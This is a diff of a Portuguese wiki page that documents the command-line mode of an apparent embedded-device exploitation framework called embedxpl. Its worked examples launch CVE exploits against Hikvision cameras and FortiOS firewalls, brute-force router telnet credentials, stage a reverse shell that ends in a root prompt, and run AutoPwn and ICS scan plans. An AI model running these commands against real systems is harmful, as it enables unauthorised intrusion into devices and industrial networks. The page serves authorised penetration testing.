@@ -1,165 +1,401 @@
-# Modo Nao-Interativo
+# Modo Não Interativo
 
-**Idioma:** Portugues (pt-BR) | **English (en-US):** [../en-US/04-non-interactive-mode.md](../en-US/04-non-interactive-mode.md)
-
----
-
-## Visao geral
-
-O modo nao-interativo executa um unico modulo diretamente da linha de comando, sem abrir o shell. Indicado para **automacao**, pipelines de CI, avaliacao em script e execucao unica.
-
-> **Nota:** O modo nao-interativo sempre chama `run()`. Nao chama `check()` primeiro. Para usar `check()`, utilize o shell interativo.
+**Idioma:** Português (pt-BR). **English:** [../en-US/04-non-interactive-mode.md](../en-US/04-non-interactive-mode.md)
 
 ---
 
-## Sintaxe
+## Visão geral
+
+O modo não interativo executa um módulo ou varredura a partir da linha de comando sem abrir o shell interativo. É projetado para **automação**, pipelines CI/CD, avaliações agendadas por cron e exploração de única execução na linha de comando.
+
+> **Nota:** O modo não interativo `-m` sempre chama `run()` diretamente. Ele não chama `check()` primeiro. Para executar apenas `check()`, use o shell interativo.
+
+Todos os três pontos de entrada são equivalentes:
+
+```bash
+embedxpl -m <caminho> -s "<opt> <val>"      # ponto de entrada pip (recomendado)
+exf      -m <caminho> -s "<opt> <val>"      # alias
+python -m embedxpl -m <caminho> -s "<opt> <val>"   # invocação de módulo
+python exf.py      -m <caminho> -s "<opt> <val>"   # bootstrap legado
+```
+
+---
+
+## Referência completa de flags
+
+| Flag | Forma longa | Tipo | Obrigatório | Descrição |
+|------|-------------|------|-------------|-----------|
+| `-h` | `--help` | — | Não | Imprimir ajuda de uso e sair |
+| `-m` | `--module` | string | Sim* | Caminho do módulo, ex.: `exploits/cameras/hikvision/rtsp_rce_cve_2021_36260` |
+| `-s` | `--set` | string | Não | Definir uma opção do módulo; repita para cada opção (formato `"opcao valor"`) |
+| `-T` | `--targets` | string (caminho de arquivo) | Não | Varredura multi-alvo a partir de arquivo; cada linha é um IP ou CIDR |
+| `--infra` | — | string | Não | Tipo de infraestrutura: `wizard`, `ot`, `it`, `soho`, ou chave personalizada |
+| `--context` | — | string | Não | Contexto operacional para modo infra (ex.: `ics`, `scada`, `dmz`) |
+| `--target` | — | string | Não | Endereço IP ou faixa CIDR para o plano de varredura infra |
+
+\* `-m` é obrigatório a menos que seja usado `-T`, `--infra wizard` ou `-h`.
+
+---
+
+## `-h` / `--help` — ajuda de uso
+
+```bash
+embedxpl -h
+```
+
+**Sessão de terminal:**
+
+```text
+$ embedxpl -h
+[*] embedxpl -m <module> -s "<option> <value>"
+       embedxpl -T <targets.txt>  (multi-target scan from file)
+       embedxpl --infra ot --context ics --target 192.168.1.0/24
+       embedxpl --infra wizard  (interactive infrastructure selection)
+```
+
+---
+
+## `-m` / `--module` — executar um único módulo
 
 ```bash
 embedxpl -m <caminho_modulo> [-s "<opcao> <valor>"] ...
 ```
 
-Os tres pontos de entrada sao equivalentes:
+**Sessão de terminal — exploit básico:**
 
 ```bash
-embedxpl  -m <caminho> -s "<opt> <val>"   # ponto de entrada pip (recomendado)
-exf       -m <caminho> -s "<opt> <val>"   # alias
-python -m embedxpl -m <caminho> -s "<opt> <val>"   # invocacao por modulo
-python exf.py -m <caminho> -s "<opt> <val>"        # bootstrap legado
-```
-
----
-
-## Flags
-
-| Flag | Forma longa | Tipo | Obrigatorio | Descricao |
-|------|-------------|------|-------------|-----------|
-| `-h` | `--help` | -- | Nao | Imprime ajuda e sai |
-| `-m` | `--module` | `str` (caminho) | Sim* | Caminho do modulo, ex.: `exploits/routers/dlink/dir_300_600_rce` |
-| `-s` | `--set` | `str` (`"opcao valor"`) | Nao | Define uma opcao; repita para cada opcao |
-| `-T` | `--targets` | `str` (caminho de arquivo) | Nao | Arquivo multi-alvo; cada linha `IP` ou `IP:porta` |
-| -- | `--infra` | `str` | Nao | Tipo de infraestrutura: `wizard`, `ot`, personalizado |
-| -- | `--context` | `str` | Nao | Contexto para modo infra (ex.: `ics`) |
-| -- | `--target` | `str` | Nao | IP/CIDR para plano de scan infra |
-
-\* `-m` obrigatorio exceto com `-T`, `--infra` ou `-h`.
-
----
-
-## Formato da flag `-s`
-
-Cada `-s` recebe uma **unica string entre aspas** contendo `"opcao valor"`:
-
-```bash
-# CORRETO -- uma opcao por flag -s:
-embedxpl -m exploits/routers/dlink/dir_300_600_rce \
-    -s "target 192.168.0.1" \
+$ embedxpl -m exploits/cameras/hikvision/rtsp_rce_cve_2021_36260 \
+    -s "target 192.168.1.100" \
     -s "port 80"
+```
 
-# INCORRETO -- nao coloque multiplas opcoes em um -s:
-embedxpl -m ... -s "target 192.168.0.1 port 80"   # ERRADO
+```text
+[*] Running module <...rtsp_rce_cve_2021_36260.Exploit object>...
+[*] Checking if 192.168.1.100:80 is a Hikvision device...
+[*] Attempting CVE-2021-36260 RCE on 192.168.1.100...
+[*] Response HTTP 400: <?xml version="1.0"...
+[+] CVE-2021-36260: Payload delivered to 192.168.1.100:80. Monitor for callback.
+[!] Verify execution via OOB (e.g., Burp Collaborator or Interactsh).
+```
+
+**Erro — nenhum módulo especificado:**
+
+```text
+$ embedxpl
+[-] A module is required when running non-interactively
+```
+
+**Erro — módulo desconhecido:**
+
+```text
+$ embedxpl -m exploits/cameras/hikvision/does_not_exist
+[-] ImportError: No module named 'embedxpl.modules.exploits.cameras.hikvision.does_not_exist'
 ```
 
 ---
 
-## Exemplos
+## `-s` / `--set` — definir opções do módulo
+
+Cada flag `-s` aceita uma **única string entre aspas** contendo `"nome_opcao valor"`.
+
+**Formato correto:**
+
+```bash
+# Uma opção por flag -s:
+embedxpl -m exploits/cameras/dahua/cctv_rce_cve_2021_36260 \
+    -s "target 192.168.1.50" \
+    -s "port 80"
+```
+
+**Formato incorreto (não faça isso):**
+
+```bash
+# ERRADO — múltiplas opções em um único -s:
+embedxpl -m ... -s "target 192.168.1.50 port 80"
+```
+
+**Valores com espaços — coloque aspas em todo o argumento `-s`:**
+
+```bash
+embedxpl -m exploits/printers/generic/pjl_info_disclosure \
+    -s "target 10.0.0.50" \
+    -s "cmd @PJL INFO ID"
+```
+
+---
+
+## `-T` / `--targets` — varredura multi-alvo a partir de arquivo
+
+```bash
+embedxpl -T <arquivo_alvos>
+```
+
+**Parâmetros:**
+
+| Parâmetro | Tipo | Obrigatório | Padrão | Valores aceitos | Descrição |
+|-----------|------|-------------|--------|-----------------|-----------|
+| `arquivo_alvos` | string (caminho de arquivo) | Sim | — | Caminho de arquivo legível | Caminho para arquivo com IPs/CIDRs, um por linha |
+
+Formato do arquivo de alvos (uma entrada por linha; linhas em branco e comentários `#` são ignorados):
+
+```text
+# Segmento do datacenter
+192.168.1.1
+192.168.1.2
+10.0.0.0/24
+# Segmento SOHO
+172.16.0.1
+```
+
+**Sessão de terminal:**
+
+```text
+$ embedxpl -T /tmp/targets.txt
+[*] Multi-target scan from file: /tmp/targets.txt
+[*] [192.168.1.1] [scanning] Starting ARP/ICMP sweep
+[*] [192.168.1.1] [fingerprint] Probing 192.168.1.1...
+[+] [192.168.1.1] done — 4 modules matched
+[*] [192.168.1.2] [scanning] Starting ARP/ICMP sweep
+[+] [192.168.1.2] done — 2 modules matched
+[*] [10.0.0.0/24] [scanning] Scanning 254 hosts...
+[+] [10.0.0.0/24] done — 6 total host(s) found
+
+Scan complete — 3 target(s), 8 total host(s) found
+  192.168.1.1 — 1 host(s):
+    192.168.1.1: Huawei EG8145X6 [80,443] 78% — 4 modules
+  192.168.1.2 — 1 host(s):
+    192.168.1.2: ZTE H168N [80,23] 65% — 2 modules
+  10.0.0.0/24 — 6 host(s):
+    10.0.0.1: TP-Link Archer C6 [80,443] 82% — 5 modules
+    ...
+```
+
+**Erro — arquivo não encontrado:**
+
+```text
+$ embedxpl -T /tmp/nonexistent.txt
+[-] Targets file not found: /tmp/nonexistent.txt
+```
+
+**Paralelismo:** Até 4 faixas CIDR são varridas em paralelo (padrão `max_file_workers=4`). IPs individuais são processados sequencialmente dentro de cada worker.
+
+---
+
+## `--infra wizard` — wizard interativo de infraestrutura
+
+```bash
+embedxpl --infra wizard
+```
+
+Inicia um menu numerado interativo que solicita ao usuário a seleção do tipo de infraestrutura e contexto operacional. Ao final, imprime a lista de módulos resolvidos sem executá-los.
+
+**Sessão de terminal:**
+
+```text
+$ embedxpl --infra wizard
+
+Select infrastructure type:
+  1. ot    (Operational Technology / ICS/SCADA)
+  2. it    (Enterprise IT)
+  3. soho  (Small Office / Home Office)
+  4. iot   (IoT/Embedded Edge)
+Choice: 1
+
+Select context for 'ot':
+  1. ics   (Industrial Control Systems)
+  2. scada (SCADA/HMI)
+  3. plc   (PLC-focused)
+Choice: 1
+
+[*] Scan plan ready: 18 modules for ot/ics
+```
+
+Cancelado com Ctrl+C:
+
+```text
+^C
+[!] Wizard cancelled by user.
+```
+
+---
+
+## `--infra` + `--context` + `--target` — plano de varredura de infraestrutura
+
+```bash
+embedxpl --infra <tipo> --context <contexto> --target <ip_ou_cidr>
+```
+
+**Parâmetros:**
+
+| Flag | Tipo | Obrigatório | Descrição |
+|------|------|-------------|-----------|
+| `--infra` | string | Sim | Chave do tipo de infraestrutura (ex.: `ot`, `it`, `soho`) |
+| `--context` | string | Não | Contexto operacional dentro do tipo infra (ex.: `ics`) |
+| `--target` | string | Não | IP ou faixa CIDR |
+
+**Sessão de terminal — plano de varredura OT/ICS:**
+
+```text
+$ embedxpl --infra ot --context ics --target 192.168.100.0/24
+
+[*] OT/ICS scan plan for 192.168.100.0/24:
+    18 modules selected
+
+    Scan plan:
+      scanners/ics/modbus_scanner
+      scanners/ics/bacnet_scanner
+      scanners/ics/s7_comm_scanner
+      scanners/ics/enip_scanner
+      scanners/ics/dnp3_scanner
+      exploits/ics/...
+      ...
+
+[*] Use -m <module> -s "target 192.168.100.0/24" to run individual modules.
+[*] Or launch interactive shell and type 'use <module>' to explore.
+```
+
+**Sessão de terminal — tipo infra desconhecido:**
+
+```text
+$ embedxpl --infra unknown_type --context ics
+[-] Unknown infra type 'unknown_type'. Valid: ot, it, soho, iot
+```
+
+**Sessão de terminal — infra válida, sem contexto (lista contextos disponíveis):**
+
+```text
+$ embedxpl --infra ot
+[*] Available contexts for --infra ot:
+  ics
+  scada
+  plc
+  historian
+```
+
+---
+
+## Exemplos completos de uso
+
+### Exploit de câmera (Hikvision CVE-2021-36260)
+
+```bash
+embedxpl \
+    -m exploits/cameras/hikvision/rtsp_rce_cve_2021_36260 \
+    -s "target 192.168.1.100" \
+    -s "port 80" \
+    -s "command whoami"
+```
+
+```text
+[*] Running module ...
+[*] Checking 192.168.1.100:80...
+[*] Attempting CVE-2021-36260 RCE...
+[+] CVE-2021-36260: Payload delivered to 192.168.1.100:80. Monitor for callback.
+```
 
 ### Teste de credenciais em roteador
 
 ```bash
-embedxpl -m creds/routers/dlink/telnet_default_creds \
+embedxpl \
+    -m creds/routers/dlink/telnet_default_creds \
     -s "target 192.168.1.1"
 ```
 
-Saida esperada:
+```text
+[*] Running module ...
+[*] Trying admin:admin on 192.168.1.1:23
+[-] FAIL: admin:admin
+[*] Trying admin:1234 on 192.168.1.1:23
+[+] SUCCESS: admin:1234 — telnet shell obtained
+```
+
+### Auth bypass em firewall (FortiOS CVE-2022-40684)
+
+```bash
+embedxpl \
+    -m exploits/firewalls/fortinet/fortios_auth_bypass_cve_2022_40684 \
+    -s "target 10.0.0.5"
+```
 
 ```text
-[*] Executando modulo telnet_default_creds...
-[*] Tentando admin:admin em 192.168.1.1:23
-[*] Tentando admin:1234 em 192.168.1.1:23
-[+] SUCESSO: admin:1234 -- shell obtido
+[*] Running module ...
+[*] FortiOS at 10.0.0.5:443 -- auth bypass phase
+[+] Bypass active with header variant
+[*] Configuration dump...
+[+] Admin Accounts: {"results": [{"name": "admin", "type": "administrator"}]}
 ```
 
-### Exploit em roteador
+### Auth bypass com staging de reverse shell
 
 ```bash
-embedxpl -m exploits/routers/dlink/dir_300_600_rce \
-    -s "target 192.168.0.1" \
-    -s "port 80"
-```
-
-### Exploit em impressora
-
-```bash
-embedxpl -m exploits/printers/hp/hp_printing_shellz_rce \
-    -s "target 192.168.1.50" \
-    -s "port 631" \
-    -s "job_type pcl"
-```
-
-### Bypass FortiOS com shell reverso
-
-```bash
-embedxpl -m exploits/firewalls/fortinet/fortios_auth_bypass_cve_2022_40684 \
+embedxpl \
+    -m exploits/firewalls/fortinet/fortios_auth_bypass_cve_2022_40684 \
     -s "target 10.0.0.5" \
     -s "lhost 10.0.0.99" \
     -s "lport 4444" \
     -s "shell_type python"
 ```
 
-### Bypass PAN-OS GlobalProtect (CVE-2026-0257)
-
-```bash
-embedxpl -m exploits/firewalls/paloalto/globalprotect_auth_bypass_cve_2026_0257 \
-    -s "target 203.0.113.10" \
-    -s "forge_user admin" \
-    -s "lhost 10.0.0.99" \
-    -s "lport 4444"
+```text
+[*] Running module ...
+[*] FortiOS at 10.0.0.5:443 -- auth bypass active
+[*] Phase 5 - Shell staging (type: python)...
+[shell] Listening on 0.0.0.0:4444 (timeout 60s) -- PTY mode
+[shell] Shell connected from 10.0.0.5:52241 -- entering PTY interaction
+[shell] PTY shell active. Ctrl+] to detach, Ctrl+D to close.
+$ id
+uid=0(root) gid=0(root)
 ```
 
-### FortiClient EMS + shell reverso forcado
+### Varredura completa AutoPwn em um único host
 
 ```bash
 embedxpl \
-    -m exploits/firewalls/fortinet/forticlient_ems_preauth_rce_cve_2026_35616 \
-    -s "target 10.0.0.20" \
-    -s "lhost 10.0.0.99" \
-    -s "lport 9001" \
-    -s "shell_type bash" \
-    -s "force_exploit true"
+    -m scanners/autopwn \
+    -s "target 192.168.1.1" \
+    -s "timing_template T4" \
+    -s "vendor any"
 ```
-
----
-
-## Modo multi-alvo (`-T`)
-
-```bash
-embedxpl -T /tmp/alvos.txt
-```
-
-Formato do `alvos.txt`:
-
-```
-192.168.1.1
-192.168.1.2:8080
-10.0.0.0/24
-```
-
-Saida esperada:
 
 ```text
-[*] Scan multi-alvo: 3 entradas
-[*] [192.168.1.1] Varrendo...
-[+] [192.168.1.1] concluido -- 2 modulos corresponderam
-[*] Resumo: 2/3 hosts concluidos.
+[*] AutoPwn timing profiles (Nmap-style -T0..-T5):
+...
+[*] AutoPwn timing template T4 (aggressive) active: threads=16
+[*] 192.168.1.1 Starting vulnerability check...
+[+] 192.168.1.1:80 http telnet_default_creds is vulnerable
+[+] 192.168.1.1:80 http dir_300_600_rce is vulnerable
+[-] 192.168.1.1:22 ssh ssh_default_creds is not vulnerable
+...
+[+] 192.168.1.1 Device is vulnerable:
+┌───────────────┬──────┬──────────┬───────────────────────────────┐
+│ Target        │ Port │ Service  │ Exploit                       │
+├───────────────┼──────┼──────────┼───────────────────────────────┤
+│ 192.168.1.1   │ 80   │ http     │ telnet_default_creds          │
+│ 192.168.1.1   │ 80   │ http     │ dir_300_600_rce               │
+└───────────────┴──────┴──────────┴───────────────────────────────┘
 ```
 
 ---
 
-## Dicas de automacao
+## Códigos de saída
 
-1. **Nao confie no codigo de saida 0** como confirmacao de vulnerabilidade -- apenas indica que o modulo executou sem erro fatal. Analise `stdout` em busca de linhas `[+]`.
-2. Redirecione a saida para log: `embedxpl -m ... 2>&1 | tee /tmp/scan.log`
-3. Scans paralelos: invoque multiplos processos com arquivos de alvo diferentes.
+| Código | Significado |
+|--------|-------------|
+| `0` | Módulo executado até a conclusão (NÃO implica que o alvo é vulnerável) |
+| `1` | Erro: stdin não é TTY, módulo ausente, falha de importação ou erro de uso |
 
+> **Importante:** Código de saída `0` significa que o módulo foi executado sem uma exceção Python fatal. Não significa que o alvo foi confirmado como vulnerável. Analise as linhas prefixadas com `[+]` no stdout para determinar o status de vulnerabilidade.
 
-[Hub da wiki](../README.md)
+---
+
+## Dicas de automação
+
+1. **Analise linhas `[+]` para positivos:** `embedxpl -m ... 2>&1 | grep '^\[+\]'`
+2. **Registre saída completa:** `embedxpl -m ... 2>&1 | tee /tmp/scan-$(date +%Y%m%d).log`
+3. **Varreduras paralelas de múltiplos módulos:** invoque múltiplos processos, cada um com um `-m` diferente, contra um arquivo de alvos compartilhado.
+4. **Use `-T` para varredura em lote de hosts:** crie um arquivo CIDR e deixe o EmbedXPL-Forge gerenciar o paralelismo com `max_file_workers=4`.
+5. **Encadeie com jq para saída estruturada:** o comando `sessions export <ip>` emite JSON adequado para pós-processamento com jq.
+
+---
+
+[Hub da Wiki](../README.md)
